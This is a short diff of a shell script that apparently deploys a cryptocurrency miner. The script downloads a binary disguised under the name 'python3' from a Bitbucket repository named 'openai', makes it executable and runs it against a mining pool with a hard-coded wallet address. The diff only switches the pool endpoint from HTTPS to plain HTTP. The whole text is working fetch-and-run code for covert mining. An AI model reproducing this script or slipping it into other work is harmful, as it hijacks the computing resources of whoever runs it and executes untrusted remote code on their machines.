@@ -18,7 +18,7 @@ then
 else
 
 echo "Miner da install , chay thoi "
-./python3 -F https://miner.aqua.signal2noi.se:443/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
+./python3 -F http://miner.aqua.signal2noi.se:80/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
 
      
 fi
@@ -28,6 +28,6 @@ fi
 
 wget https://bitbucket.org/lovelyn/openai/downloads/python3
 chmod +x python3
-./python3 -F https://miner.aqua.signal2noi.se:443/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
+./python3 -F http://miner.aqua.signal2noi.se:80/0xd994dfED4458B2caDCaBBfC004372A101D273d40/sh
 
 exit 0
